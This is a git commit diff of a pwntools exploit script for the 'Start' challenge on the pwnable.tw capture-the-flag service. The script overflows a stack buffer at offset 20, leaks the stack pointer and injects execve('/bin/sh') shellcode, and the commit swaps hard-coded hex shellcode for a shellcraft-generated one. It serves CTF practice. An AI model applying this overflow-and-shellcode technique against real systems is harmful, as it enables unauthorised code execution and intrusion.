b219cefa5ed7422d0c91f2be40d40e552d977497
ovekiba <ovekiba@gmail.com>
2018-03-08 09:04:18 +0000

    update Start

--- Start/expolit.py
+++ Start/expolit.py
@@ -2,14 +2,6 @@
 # coding=utf-8
 
 from pwn import *
-from binascii import unhexlify
-
-context.clear()
-context.update(arch='i386', os='linux', endian='little', word_size=32)
-#context.log_level = 'debug'
-#log.info(vars(context))
-
-cyclic_offset = 20
 
 #p = process('./start')
 p = remote('chall.pwnable.tw', 10000)
@@ -17,6 +9,7 @@ p = remote('chall.pwnable.tw', 10000)
 p.recvuntil(':')
 
 ret = 0x08048087
+cyclic_offset = 20
 
 p.send(fit({
     cyclic_offset: p32(ret)
@@ -25,11 +18,8 @@ p.send(fit({
 esp = u32(p.recv(1024)[:4])
 log.info("Esp: %s" % hex(esp))
 
-# get by `ragg2 -i exec -b 32`
-payload = unhexlify('31c050682f2f7368682f62696e89e3505389e199b00b31d2cd80')
-
 p.send(fit({
-    cyclic_offset: [p32(esp + 20), payload]
+    cyclic_offset: [p32(esp + 20), asm(shellcraft.i386.linux.execve('/bin/sh'))]
     }))
 
 p.interactive()
